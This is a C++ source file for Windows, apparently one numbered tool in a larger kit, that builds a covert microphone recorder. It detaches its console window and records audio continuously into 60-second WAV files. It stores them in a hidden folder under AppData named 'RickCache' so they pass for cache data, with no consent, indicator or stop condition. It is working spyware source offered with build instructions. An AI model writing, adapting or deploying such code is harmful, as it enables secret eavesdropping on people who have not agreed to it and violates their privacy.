// language: C++17, file: src/tools/10_mic_rec.cpp, target: Windows 10/11, MSVC/MinGW
// Micro recorder - waveIn 16 kHz mono 16-bit, WAV de 60 s en boucle
// MinGW: g++ -O2 -std=c++17 10_mic_rec.cpp -o mic.exe -lwinmm
#include <windows.h>
#include <mmsystem.h>
#include <cstdio>
#include <cstring>
#include <ctime>
#include <string>

#pragma comment(lib, "winmm.lib")

static const int   kRate    = 16000; // Hz, mono, 16-bit
static const int   kBufSec  = 4;     // taille d'un buffer waveIn
static const int   kNBuf    = 20;    // 20 x 4 s = 80 s en rotation
static const DWORD kFileSec = 60;    // un WAV de 60 s

static std::string OutDir() {
    char path[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
    strcat_s(path, "\\RickCache");
    CreateDirectoryA(path, NULL);
    strcat_s(path, "\\mic");
    CreateDirectoryA(path, NULL);
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);
    return path;
}

static void WriteWavHeader(FILE* f, DWORD dataBytes) {
    DWORD byteRate = kRate * 2;
    DWORD chunk = 36 + dataBytes;
    fwrite("RIFF", 1, 4, f); fwrite(&chunk, 4, 1, f);
    fwrite("WAVE", 1, 4, f);
    fwrite("fmt ", 1, 4, f); DWORD fmtSz = 16; fwrite(&fmtSz, 4, 1, f);
    WORD pcm = WAVE_FORMAT_PCM, ch = 1, align = 2, bits = 16;
    fwrite(&pcm, 2, 1, f); fwrite(&ch, 2, 1, f);
    fwrite(&kRate, 4, 1, f); fwrite(&byteRate, 4, 1, f);
    fwrite(&align, 2, 1, f); fwrite(&bits, 2, 1, f);
    fwrite("data", 1, 4, f); fwrite(&dataBytes, 4, 1, f);
}

int main() {
    FreeConsole();
    std::string dir = OutDir();

    WAVEFORMATEX wf{};
    wf.wFormatTag      = WAVE_FORMAT_PCM;
    wf.nChannels       = 1;
    wf.nSamplesPerSec  = kRate;
    wf.nAvgBytesPerSec = kRate * 2;
    wf.nBlockAlign     = 2;
    wf.wBitsPerSample  = 16;

    HWAVEIN hIn = NULL;
    if (waveInOpen(&hIn, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) return 1;

    const DWORD bufBytes = kRate * 2 * kBufSec;
    BYTE* bufs = new BYTE[kNBuf * bufBytes];
    WAVEHDR hdr[kNBuf]{};
    for (int i = 0; i < kNBuf; i++) {
        hdr[i].lpData         = (LPSTR)(bufs + i * bufBytes);
        hdr[i].dwBufferLength = bufBytes;
        waveInPrepareHeader(hIn, &hdr[i], sizeof(WAVEHDR));
        waveInAddBuffer(hIn, &hdr[i], sizeof(WAVEHDR));
    }
    waveInStart(hIn);

    DWORD written = 0;   // octets du fichier courant
    FILE* out = nullptr;
    char name[64] = {0};
    int rec = 0;

    for (;;) {
        for (int i = 0; i < kNBuf; i++) {
            if (!(hdr[i].dwFlags & WHDR_DONE)) continue;

            // nouveau fichier toutes les 60 s
            if (!out) {
                time_t t = time(nullptr);
                tm lt; localtime_s(&lt, &t);
                char ts[32]; strftime(ts, sizeof(ts), "%Y%m%d_%H%M%S", &lt);
                snprintf(name, sizeof(name), "%s\\rec_%s.wav", dir.c_str(), ts);
                out = fopen(name, "wb");
                if (out) WriteWavHeader(out, kRate * 2 * kFileSec);
                written = 0;
            }
            if (out) {
                fwrite(hdr[i].lpData, 1, bufBytes, out);
                written += bufBytes;
                if (written >= kRate * 2 * kFileSec) { fclose(out); out = nullptr; }
            }
            // recycle le buffer dans la rotation
            waveInUnprepareHeader(hIn, &hdr[i], sizeof(WAVEHDR));
            hdr[i].lpData         = (LPSTR)(bufs + i * bufBytes);
            hdr[i].dwBufferLength = bufBytes;
            hdr[i].dwFlags        = 0;
            waveInPrepareHeader(hIn, &hdr[i], sizeof(WAVEHDR));
            waveInAddBuffer(hIn, &hdr[i], sizeof(WAVEHDR));
        }
        Sleep(200);
        rec++;
    }
    waveInReset(hIn);
    waveInClose(hIn);
    delete[] bufs;
    return 0;
}
